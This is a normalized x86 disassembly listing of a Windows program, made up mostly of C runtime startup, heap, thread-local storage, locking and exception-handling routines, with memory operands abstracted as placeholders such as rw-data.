retn
sub_403e10
mov edx [ ecx + 0xc ]
mov ecx [ ecx ]
mov [ eax + 0x4 ] 0x0
mov [ eax ] ecx
mov [ eax + 0x8 ] edx
retn
sub_4042d0
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
retn
lea esp [ esp ]
mov eax ecx
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_4043a0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
mov esi ecx
call sub_404b6d
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4048da
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_404b6d
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_404927
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_404b6d
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_404974
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_404b6d
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4049b2
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_4049d7
sub_4049cc
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_404f01
sub_404a57
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x0
pop ebp
retn 0x8
sub_404a74
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_404ac1
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call sub_404f01
pop ecx
sub_404b3b
mov [ ecx ] r--data
jmp sub_404ac1
sub_405064
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_4062c8
pop ecx
retn
sub_40520d
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x24 ] ecx
push eax
push ecx
call sub_406418
pop ecx
pop ecx
retn
sub_405221
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_405a7c
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_406c65
retn
push eax
call sub_405a57
_start
call sub_406e0f
jmp sub_4050de
sub_4054c4
call sub_40580a
retn
sub_4054ca
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_40548e
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_4054e1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_40570e
push 0xa
call [ IsProcessorFeaturePresent@IAT ]
mov [ rw-data ] eax
xor eax eax
retn
sub_40571e
push 0x0
push 0x1000
push 0x0
call [ HeapCreate@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_4057e9
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_4057be
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_405801
push 0x8
call sub_40713e
pop ecx
retn
sub_40580a
push 0x8
call sub_407065
pop ecx
retn
sub_405a2c
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_407065
pop ecx
sub_405a41
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_405901
add esp 0xc
pop ebp
retn
sub_405a57
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_405901
add esp 0xc
pop ebp
retn
sub_405a6d
push 0x1
push 0x0
push 0x0
call sub_405901
add esp 0xc
retn
sub_405a7c
push 0x1
push 0x1
push 0x0
call sub_405901
add esp 0xc
retn
sub_405a8b
mov edi edi
push ebp
mov ebp esp
call sub_405c7e
push [ ebp + 0x8 ]
call sub_405acf
pop ecx
push 0xff
call sub_405a57
int3
sub_405cb7
push 0x0
call [ EncodePointer@IAT ]
retn
sub_405cc0
call [ TlsAlloc@IAT ]
retn 0x4
sub_405ddc
push 0xd
call sub_407065
pop ecx
retn
sub_405de5
push 0xc
call sub_407065
pop ecx
retn
sub_405f9b
push 0xd
call sub_407065
pop ecx
retn
sub_405fa7
push 0xc
call sub_407065
pop ecx
retn
sub_40612e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_4062b8
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40628b
add esp 0x14
retn
sub_40632f
push 0xe
call sub_407065
pop ecx
retn
sub_40640a
push sub_4063c8
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
sub_406c65
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_406eaa
and [ rw-data ] 0x0
retn
sub_407065
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_407135
push 0xa
call sub_407065
pop ecx
retn
sub_407171
push 0x8
push r--data
call sub_406c20
call sub_405e67
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_40869a
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_407191
xor eax eax
inc eax
retn
sub_4071aa
call sub_405e67
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_407171
call eax
sub_4071e1
xor eax eax
inc eax
retn
sub_4071f5
push sub_407171
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_407206
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_40725b
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_4073cf
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_407065
pop ecx
sub_40740b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_40741a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_40756b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
cmp [ ecx ] 0xc0000005
sete dl
mov eax edx
retn
sub_407c34
push 0xc
call sub_407065
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_407efe
push 0xd
call sub_407065
pop ecx
retn
sub_408354
push 0xd
call sub_407065
pop ecx
retn
sub_40838d
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_4081f3
pop ecx
mov [ rw-data ] 0x1
sub_408506
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_408430
add esp 0xc
pop ebp
retn 0x4
sub_408539
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_409505
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_40856b
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_408430
add esp 0xc
pop ebp
retn 0x8
sub_4085d5
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_408582
add esp 0x10
pop ebp
retn
sub_408a51
push 0x2
call sub_405a8b
sub_4094d9
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_409410
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_409524
call eax
retn
sub_409530
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_409560
sub_409546
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_409560
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_409aac
mov [ ecx ] r--data
jmp sub_404b3b
sub_409c0a
push [ ebp - 0x14 ]
call sub_409b3d
pop ecx
retn
sub_409c4e
call sub_405e67
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_405e67
dec [ eax + 0x90 ]
sub_409cf0
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_409cf9
mov esp [ ebp - 0x18 ]
call sub_407171
sub_409da6
push 0x4
mov eax sub_40a9f4
call sub_40a7dc
call sub_405e67
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_4071aa
call sub_4071bd
sub_409e7f
mov eax [ ebp - 0x14 ]
call sub_409c68
retn
sub_40a0f6
xor eax eax
inc eax
retn
sub_40a0fa
mov esp [ ebp - 0x18 ]
call sub_407171
sub_40a18f
xor eax eax
inc eax
retn
sub_40a193
mov esp [ ebp - 0x18 ]
call sub_407171
sub_40a686
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_404b6d
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40a812
mov edi edi
push ebp
mov ebp esp
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
xor eax eax
sub_40a830
mov eax [ ebp + 0x8 ]
jmp sub_403c80
sub_40a838
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4049bd
mov eax r--data
jmp sub_409755
sub_40a860
mov eax [ ebp + 0x8 ]
push eax
call sub_401650
retn
sub_40a86a
mov esi [ ebp + 0x8 ]
add esi 0x10
jmp sub_403b90
sub_40a875
mov eax [ ebp + 0x8 ]
add eax 0x20
push eax
call sub_401650
retn
sub_40a882
mov eax [ ebp + 0x8 ]
add eax 0x30
push eax
call sub_401650
retn
sub_40a88f
mov eax [ ebp + 0x8 ]
add eax 0x40
push eax
call sub_401650
retn
sub_40a89c
mov eax [ ebp + 0x8 ]
add eax 0x50
push eax
call sub_401650
retn
sub_40a8a9
mov eax [ ebp + 0x8 ]
add eax 0x74
jmp sub_4016b0
sub_40a8b4
mov eax [ ebp + 0x8 ]
add eax 0x8c
jmp sub_4016b0
sub_40a8c1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_4049bd
mov eax r--data
jmp sub_409755
sub_40a8e0
mov eax [ ebp - 0x14 ]
push eax
call sub_4049cc
pop ecx
retn
sub_40a8eb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4049bd
mov eax r--data
jmp sub_409755
sub_40a910
lea esi [ ebp - 0x1ec ]
jmp sub_403b90
sub_40a91b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x34c ]
mov ecx [ edx - 0x350 ]
xor ecx eax
call sub_4049bd
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_4049bd
mov eax r--data
jmp sub_409755
sub_40a950
mov eax [ ebp + 0x8 ]
push eax
call sub_401650
retn
sub_40a95a
mov esi [ ebp + 0x8 ]
add esi 0x10
jmp sub_403b90
sub_40a965
mov eax [ ebp + 0x8 ]
add eax 0x20
push eax
call sub_401650
retn
sub_40a972
mov eax [ ebp + 0x8 ]
add eax 0x30
push eax
call sub_401650
retn
sub_40a97f
mov eax [ ebp + 0x8 ]
add eax 0x40
push eax
call sub_401650
retn
sub_40a98c
mov eax [ ebp + 0x8 ]
add eax 0x50
push eax
call sub_401650
retn
sub_40a999
mov eax [ ebp + 0x8 ]
add eax 0x74
jmp sub_4016b0
sub_40a9a4
mov eax [ ebp + 0x8 ]
add eax 0x8c
jmp sub_4016b0
sub_40a9b1
mov eax [ ebp - 0x10 ]
jmp sub_403c80
sub_40a9b9
mov eax [ ebp - 0x14 ]
jmp sub_403c80
sub_40a9c1
mov eax [ ebp - 0x14 ]
jmp sub_403c80
sub_40a9c9
mov eax [ ebp - 0x14 ]
jmp sub_403c80
sub_40a9d1
mov eax [ ebp + 0x8 ]
jmp sub_403c80
sub_40a9d9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4049bd
mov eax r--data
jmp sub_409755
sub_40a9f4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4049bd
mov eax r--data
jmp sub_409755
sub_40aa0f
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_404b3b
